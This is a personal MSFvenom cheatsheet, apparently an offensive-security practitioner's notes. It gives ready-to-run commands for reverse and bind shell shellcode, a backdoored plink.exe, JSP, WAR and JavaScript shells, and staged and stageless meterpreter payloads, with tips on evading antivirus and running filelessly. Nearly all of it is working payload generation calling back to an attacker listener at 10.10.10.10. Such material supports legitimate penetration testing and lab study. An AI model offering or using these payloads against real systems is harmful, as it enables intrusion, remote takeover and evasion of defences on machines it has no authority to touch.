---
description: >-
  My various MSFvenom commands to generate shellcode, reverse shells, and
  meterpreter payloads that I end up using over, and over, and over, and over...
---
# MSFvenom Cheatsheet
## Shellcode Generation

### Windows Reverse TCP Shell \(Shellcode x86\)
Only use this one if payload size is no problem and you can't determine the bad chars:
```sh
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"
```
### Windows Reverse TCP Shell Embedded in \`plink.exe\`
Note: `shikata_ga_nai` encoder is deprecated and easily detected by modern AVs. Use `-e x64/zutto_dekiru` for x64 or avoid encoding entirely if not needed.
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -x /usr/share/windows-binaries/plink.exe -o burmat_embedded.exe
```
### Bind Shell Shellcode
```sh
msfvenom -p windows/shell_bind_tcp RHOST=10.11.11.11 LPORT=1337 -b '\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40' -f python
```
## Reverse Shells
Oddball reverse shells that can trip you up. Those "Wait, I've done this before?" moments. Like when you see Tomcat running with default credentials or a ColdFusion site.
### JSP Reverse Shell
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw -o burmat.jsp
```
### JavaScript Reverse Shells
If you are attacking a Windows host:
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f js_le -e generic/none
```
If you are attacking a Linux host:
`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 CMD=/bin/bash -f js_le -e generic/none`
### WAR \(Java\) Reverse Shell
```sh
msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f war -o burmat.war
```

## Modern Payloads

### PowerShell One-Liner (Base64 Encoded)
Generate a PowerShell payload that can be executed directly via command line. Useful for remote execution without touching disk.
```sh
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f psh-cmd
```

### Python Stageless Payload
Stageless payloads are more reliable and don't require callback staging. Great for Linux targets with Python installed.
```sh
msfvenom -p python/meterpreter_reverse_https LHOST=10.10.10.10 LPORT=443 -f raw -o burmat.py
```

### Windows Stageless Meterpreter (x64)
Stageless payloads include the full meterpreter in the payload, avoiding multi-stage detection. Larger file size but more reliable.
```sh
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.10.10 LPORT=443 -f exe -o burmat.exe
```

### PowerShell Reflection (Fileless)
Generate PowerShell that loads meterpreter via reflection, never touching disk. Best for modern Windows environments with logging.
```sh
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f psh-reflection -o burmat.ps1
```